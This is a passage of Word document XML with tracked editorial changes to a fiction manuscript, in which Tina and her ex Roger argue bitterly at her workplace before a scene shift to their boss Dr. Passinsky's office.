      </w:ins>
      <w:del w:id="464" w:author="TextVet" w:date="2016-03-15T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001B1BAA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fired back</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “As a matter of fact, it turned out you’d already </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>been</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> seeing other people!”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was just saying we should have an open relationship,” Roger said. “You’re the one that wasn’t down for it. So I really don’t see where you think you have the right to be upset.”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gulped down bile. “You… ‘really don’t see…’?” she repeated incredulously. “Seriously, Rog? Even you can’t be that obtuse.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="002A014D" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="465" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>“I am not a mind-reader.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">” </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Roger s</w:t>
      </w:r>
      <w:ins w:id="466" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r w:rsidR="001D1886">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>poke</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="467" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="001D1886">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aid</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> slowly, punctuating with his hands</w:t>
      </w:r>
      <w:ins w:id="468" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="469" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="002A014D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="470" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="471" w:author="TextVet" w:date="2016-03-15T15:36:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="002A014D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">“I am not a mind-reader. </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>So</w:t>
      </w:r>
      <w:ins w:id="472" w:author="TextVet" w:date="2016-03-15T15:37:00Z">
        <w:r w:rsidR="00031E9B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> when I say that I have no idea where you get off being so pissed about a relationship that </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>you</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> ended, it’s </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> because I’m being ‘obtuse’. It’s because </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>you</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> aren’t making any sense. It’s because </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>you</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> are failing to </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>communicate</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. And like you said, your </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>whole job</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is to sit here and talk to people on the phone all day, so you’d think you’d know how </w:t>
      </w:r>
      <w:commentRangeStart w:id="473"/>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to at least do</w:t>
      </w:r>
      <w:commentRangeEnd w:id="473"/>
      <w:r w:rsidR="00A81D69">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="473"/>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidR="000D3488"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Tina’s mind blanked with anger. She couldn’t begin to count the number of dimensions on which Roger’s comment hurt.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grabbed her iPhone and flung it at his stupid asshole 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lens of his glasses cracked on impact. She </w:t>
      </w:r>
      <w:ins w:id="474" w:author="TextVet" w:date="2016-03-15T15:39:00Z">
        <w:r w:rsidR="00C9369D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>wheeled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="475" w:author="TextVet" w:date="2016-03-15T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C9369D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>turned away</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from him, her arms </w:t>
      </w:r>
      <w:ins w:id="476" w:author="TextVet" w:date="2016-03-15T15:39:00Z">
        <w:r w:rsidR="00C9369D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">welded </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crossed</w:t>
      </w:r>
      <w:del w:id="477" w:author="TextVet" w:date="2016-03-15T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C9369D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> tightly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="478" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidR="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>J</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="479" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>She could feel her j</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>agged breaths pound</w:t>
      </w:r>
      <w:ins w:id="480" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidR="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="481" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="482" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">against </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>her ribcage.</w:t>
      </w:r>
      <w:ins w:id="483" w:author="TextVet" w:date="2016-03-15T15:40:00Z">
        <w:r w:rsidR="00ED306B">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“Roger,” she s</w:t>
      </w:r>
      <w:ins w:id="484" w:author="TextVet" w:date="2016-03-15T15:41:00Z">
        <w:r w:rsidR="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:ins w:id="485" w:author="TextVet" w:date="2016-03-15T15:41:00Z">
        <w:r w:rsidR="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rte</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="486" w:author="TextVet" w:date="2016-03-15T15:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00ED306B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d, struggling to keep her voice steady through </w:t>
      </w:r>
      <w:del w:id="487" w:author="TextVet" w:date="2016-03-15T15:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B353F8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the lump in </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>her throat</w:t>
      </w:r>
      <w:ins w:id="488" w:author="TextVet" w:date="2016-03-15T15:41:00Z">
        <w:r w:rsidR="00B353F8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> lump</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “take your box and get the fuck out of my lobby.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:commentRangeStart w:id="489"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">The blinds on the windows to Dr. Passinsky’s </w:t>
      </w:r>
      <w:commentRangeEnd w:id="489"/>
      <w:r w:rsidR="002558F2">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="489"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>office</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> were closed. Going to the boss’s office was never pleasant, and Roger’s presence made it that much worse. She knew he’d be there. In the email </w:t>
      </w:r>
      <w:del w:id="490" w:author="TextVet" w:date="2016-03-15T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002558F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Passinsky </w:t>
      </w:r>
      <w:ins w:id="491" w:author="TextVet" w:date="2016-03-15T15:42:00Z">
        <w:r w:rsidR="002558F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sent to summon her, she</w:t>
      </w:r>
      <w:ins w:id="492" w:author="TextVet" w:date="2016-03-15T15:42:00Z">
        <w:r w:rsidR="00334707">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w:t>
      </w:r>
      <w:ins w:id="493" w:author="TextVet" w:date="2016-03-15T15:42:00Z">
        <w:r w:rsidR="00334707">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>found</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="494" w:author="TextVet" w:date="2016-03-15T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00334707">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>saw</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Roger’s email alias, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>rot13er</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”, in the “</w:t>
      </w:r>
